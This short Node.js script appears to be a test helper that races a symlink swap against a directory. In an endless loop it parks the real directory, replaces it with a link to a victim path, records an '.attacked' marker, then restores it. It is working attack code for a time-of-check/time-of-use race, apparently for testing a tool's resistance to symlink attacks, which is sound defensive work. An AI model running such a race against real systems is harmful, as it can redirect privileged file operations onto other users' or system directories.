const fs = require("node:fs")
const [directory, parked, victim, marker] = process.argv.slice(2)
fs.writeFileSync(marker, "ready")
for (;;) {
  try {
    fs.renameSync(directory, parked)
    fs.symlinkSync(victim, directory, "dir")
    fs.writeFileSync(`${marker}.attacked`, "parent")
    fs.unlinkSync(directory)
    fs.renameSync(parked, directory)
  } catch {
    try { if (fs.existsSync(parked) && !fs.existsSync(directory)) fs.renameSync(parked, directory) } catch {}
  }
}
